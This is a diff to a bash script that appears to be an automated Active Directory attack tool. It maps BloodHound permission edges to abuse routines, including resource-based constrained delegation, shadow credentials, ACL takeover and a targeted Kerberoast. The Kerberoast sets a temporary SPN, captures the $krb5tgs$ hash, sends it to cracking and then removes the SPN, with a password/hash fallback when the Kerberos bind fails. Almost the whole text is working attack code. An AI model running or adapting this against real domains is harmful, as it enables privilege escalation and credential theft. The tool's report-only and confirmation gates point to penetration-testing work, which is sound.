@@ -1427,12 +1427,28 @@ phase_bh_abuse() {
             AddAllowedToAct)       _abuse_rbcd "$tgt" ;;
             ForceChangePassword)   _abuse_user "$tgt" ;;
             ReadGMSAPassword|ReadLAPSPassword) info "  → secret read handled in the Secrets phase" ;;
-            GenericAll|GenericWrite|WriteDacl|WriteOwner|Owns|AllExtendedRights)
+            GenericWrite)
                 case "$cls" in
                     Group)    _abuse_group "$tgt" ;;
-                    Computer) _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" ;;
+                    Computer) _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt" ;;
+                    OU)       loot "GenericWrite over OU '$tgt' → restore handled in the lifecycle phase if deleted children are writable" ;;
+                    *)        if [[ "$tgt" == *\$ ]]; then _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt"
+                              else _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt"; fi ;;
+                esac ;;
+            GenericAll|AllExtendedRights)
+                case "$cls" in
+                    Group)    _abuse_group "$tgt" ;;
+                    Computer) _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt" ;;
                     OU)       loot "GenericAll over OU '$tgt' → restore handled in the lifecycle phase" ;;
-                    *)        _abuse_user_smart "$tgt" ;;
+                    *)        if [[ "$tgt" == *\$ ]]; then _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt"
+                              else _abuse_user_smart "$tgt"; fi ;;
+                esac ;;
+            WriteDacl|WriteOwner|Owns)
+                case "$cls" in
+                    Group)    _abuse_group "$tgt" ;;
+                    Computer) _abuse_acl_takeover "$tgt" || _abuse_rbcd "$tgt" || _abuse_shadowcred "$tgt" || _abuse_writespn "$tgt" ;;
+                    OU)       loot "${right} over OU '$tgt' → restore handled in the lifecycle phase" ;;
+                    *)        _abuse_acl_takeover "$tgt" ;;
                 esac ;;
         esac
     done <<<"$edges"
@@ -1907,6 +1923,14 @@ bloody_args() {
     printf '%s\n' "${a[@]}"
 }
 
+bloody_args_plain() {
+    local a=(--host "$DCT" --dc-ip "$DC_IP" -d "$DOMAIN" -u "$USER")
+    if   [[ -n "$HASH" ]]; then a+=(-p ":$HASH")
+    elif [[ -n "$PASS" ]]; then a+=(-p "$PASS")
+    else return 1; fi
+    printf '%s\n' "${a[@]}"
+}
+
 # Record the current (authenticated) identity as compromised, with the groups it
 # belongs to, so the final summary can list "who we own" and crown the admins.
 # Group membership is read via LDAP memberOf (bloodyAD) — any authenticated user
@@ -2226,28 +2250,51 @@ _abuse_rbcd() {
 
 # Targeted Kerberoast via WriteSPN: set a temp SPN, roast, then remove it
 _abuse_writespn() {
-    local target="$1"; local ba; mapfile -t ba < <(bloody_args)
+    local target="$1"; local ba pba; mapfile -t ba < <(bloody_args)
     [[ "$CAP_KERBEROS" != "1" ]] && return
     warn "WriteSPN over '${C_BOLD}$target${C_RESET}' → targeted Kerberoast possible"
     [[ "$DO_ABUSE" != "1" ]] && { info "  (report-only; --abuse to set a temp SPN and roast '$target')"; return; }
     abuse_confirm "  Set a temporary SPN on '$target' and Kerberoast it?" || return
     local spn="ADAUTOPWN/$target"
-    if bloodyAD "${ba[@]}" set object "$target" servicePrincipalName -v "$spn" 2>&1 | tee -a "$LOGFILE" | grep -qiE 'success|added|modif'; then
+    local setout auth_used="kerberos"
+    run "bloodyAD ${ba[*]} set object '$target' servicePrincipalName -v '$spn'"
+    setout=$(bloodyAD "${ba[@]}" set object "$target" servicePrincipalName -v "$spn" 2>&1); echo "$setout" | tee -a "$LOGFILE"
+
+    # Keep Kerberos-first, but some bloodyAD/certipy builds fail LDAP SASL while
+    # the same account works with a simple bind. Treat that as a tool fallback,
+    # not as a policy change.
+    if ! grep -qiE 'success|added|modif|written' <<<"$setout" && [[ -n "$PASS$HASH" ]]; then
+        mapfile -t pba < <(bloody_args_plain)
+        if [[ ${#pba[@]} -gt 0 ]]; then
+            auth_used="plain"
+            warn "Kerberos SPN write failed for '$target' → retrying bloodyAD with password/hash fallback"
+            run "bloodyAD ${pba[*]} set object '$target' servicePrincipalName -v '$spn'"
+            setout=$(env -u KRB5CCNAME bloodyAD "${pba[@]}" set object "$target" servicePrincipalName -v "$spn" 2>&1); echo "$setout" | tee -a "$LOGFILE"
+        fi
+    fi
+
+    if grep -qiE 'success|added|modif|written' <<<"$setout"; then
+        local -a rba=("${ba[@]}")
+        [[ "$auth_used" == "plain" && ${#pba[@]} -gt 0 ]] && rba=("${pba[@]}")
         rb_record "Set temporary SPN $spn on $target" \
-                  "bloodyAD ${ba[*]} remove object '$target' servicePrincipalName -v '$spn'"
+                  "bloodyAD ${rba[*]} remove object '$target' servicePrincipalName -v '$spn'"
         local outf="$OUTDIR/kerberoast_writespn_$(_safe_name "$target").txt"
         run "impacket-GetUserSPNs $(imp_principal) -k -no-pass -request-user $target"
-        KRB5CCNAME="$KERB_TICKET" impacket-GetUserSPNs "$(imp_principal)" -k -no-pass \
-            -dc-host "${DC_FQDN:-$DC_IP}" -request-user "$target" -outputfile "$outf" 2>&1 | tee -a "$LOGFILE"
+        local roastout
+        roastout=$(KRB5CCNAME="$KERB_TICKET" impacket-GetUserSPNs "$(imp_principal)" -k -no-pass \
+            -dc-host "${DC_FQDN:-$DC_IP}" -request-user "$target" -outputfile "$outf" 2>&1)
+        echo "$roastout" | tee -a "$LOGFILE"
+        grep -oP '\$krb5tgs\$[^\r\n]+' <<<"$roastout" >>"$outf" 2>/dev/null || true
+        [[ -s "$outf" ]] && sort -u -o "$outf" "$outf"
         if [[ -s "$outf" ]]; then
             loot "★ WriteSPN Kerberoast hash captured for $target"
             cat "$outf" >>"$OUTDIR/kerberoast_hashes.txt"
             [[ "$DO_CRACK" == "1" ]] && crack_hashes "$outf" 13100 "Kerberoast"
         fi
-        bloodyAD "${ba[@]}" remove object "$target" servicePrincipalName -v "$spn" 2>&1 | tee -a "$LOGFILE" >/dev/null
+        bloodyAD "${rba[@]}" remove object "$target" servicePrincipalName -v "$spn" 2>&1 | tee -a "$LOGFILE" >/dev/null
         ok "Temporary SPN removed from $target"
     else
-        warn "Could not set SPN on $target"
+        warn "Could not set SPN on $target — last bloodyAD error above"
     fi
 }
 
